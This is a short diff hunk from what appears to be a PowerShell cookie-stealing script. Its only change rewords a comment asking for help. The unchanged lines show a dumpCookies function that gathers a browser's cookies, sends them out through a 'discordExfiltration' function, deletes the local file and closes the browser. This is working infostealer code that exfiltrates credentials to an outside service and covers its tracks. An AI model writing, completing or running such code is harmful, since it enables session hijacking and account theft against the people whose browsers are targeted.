@@ -95,7 +95,7 @@ function dumpCookies($browser) {
         $message = "Cookies from $browserM :"
         sendMessage($message)
         discordExfiltration -json $json -fileOut $fullPath # I had to call the function like this...otherwise it was not working (I mean discordExfiltration($json, $fileOut))
-        # If there is any powershell expert out there that gonna help me with this issue I will be grateful (talk with me on Discord!)
+        # If there is any powershell expert out there that gonna help me with this issue I would be very grateful (talk with me on Discord!)
       
         removeFile($fullPath)
         quitx($browser)
